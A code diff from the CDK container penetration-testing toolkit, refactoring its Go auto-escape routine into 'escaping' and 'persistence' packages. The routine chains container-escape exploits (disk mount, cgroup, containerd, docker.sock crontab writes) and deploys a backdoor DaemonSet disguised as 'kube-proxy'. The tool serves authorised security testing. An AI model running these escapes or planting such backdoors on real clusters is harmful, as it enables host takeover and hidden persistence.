@@ -1,7 +1,6 @@
 //go:build !thin && !no_containerd_shim_pwn && !no_k8s_shadow_apiserver && linux
 // +build !thin,!no_containerd_shim_pwn,!no_k8s_shadow_apiserver,linux
 
-
 /*
 Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .
 
@@ -22,12 +21,13 @@ package task
 
 import (
 	"fmt"
+	"github.com/cdk-team/CDK/pkg/exploit/escaping"
+	"github.com/cdk-team/CDK/pkg/exploit/persistence"
 	"log"
 
 	"github.com/cdk-team/CDK/conf"
 	"github.com/cdk-team/CDK/pkg/cli"
 	"github.com/cdk-team/CDK/pkg/evaluate"
-	"github.com/cdk-team/CDK/pkg/exploit"
 	"github.com/cdk-team/CDK/pkg/plugin"
 	"github.com/cdk-team/CDK/pkg/tool/kubectl"
 	"github.com/cdk-team/CDK/pkg/util"
@@ -43,7 +43,7 @@ func autoEscape(shellCommand string) bool {
 	if isPrivContainer {
 		// try to write crontab after running device-mount exploit
 		log.Println("starting to deploy exploit")
-		err, mountedDirs := exploit.AllDiskMount()
+		err, mountedDirs := escaping.AllDiskMount()
 		if err != nil {
 			log.Println(err)
 		} else {
@@ -62,7 +62,7 @@ func autoEscape(shellCommand string) bool {
 		}
 
 		// try to exec shell cmd via cgroup-mount exploit
-		err = exploit.EscapeCgroup(shellCommand, "memory")
+		err = escaping.EscapeCgroup(shellCommand, "memory")
 		if err != nil {
 			log.Println(err)
 		} else {
@@ -75,7 +75,7 @@ func autoEscape(shellCommand string) bool {
 
 	// 2. escape --net=host
 	fmt.Printf("\n[Auto Escape - Shared Net Namespace]\n")
-	err := exploit.ContainerdPwn(shellCommand, "", "")
+	err := escaping.ContainerdPwn(shellCommand, "", "")
 	if err != nil {
 		log.Println(err)
 		log.Println("exploit failed.")
@@ -90,7 +90,7 @@ func autoEscape(shellCommand string) bool {
 	// write shellcode to host /etc/crontab via mounted dir
 	crontabCMD := wrapShellCMDWithCrontab("/host/etc/crontab", shellCommand, "# CDK auto exploit via docker.sock")
 
-	if exploit.DockerSockExploit("/var/run/docker.sock", crontabCMD) {
+	if escaping.DockerSockExploit("/var/run/docker.sock", crontabCMD) {
 		log.Println("exploit success.")
 		success = true
 	} else {
@@ -98,7 +98,7 @@ func autoEscape(shellCommand string) bool {
 	}
 
 	// 4. escape mounted lxcfs
-	//success = exploit.ExploitLXCFS()
+	//success = escaping.ExploitLXCFS()
 	//if success {
 	//	log.Println("exploit success.")
 	//} else {
@@ -135,7 +135,7 @@ func autoEscape(shellCommand string) bool {
 			// write shellcode to host /etc/crontab via mounted dir
 			crontabCMD := wrapShellCMDWithCrontab("# CDK auto exploit via K8s backdoor daemonset", "/host-root/etc/crontab", shellCommand)
 
-			if exploit.DeployBackdoorDaemonset(addr, tokenPath, "alpine:latest", crontabCMD, "kube-proxy") {
+			if persistence.DeployBackdoorDaemonset(addr, tokenPath, "alpine:latest", crontabCMD, "kube-proxy") {
 				log.Println("exploit success")
 				success = true
 			} else {
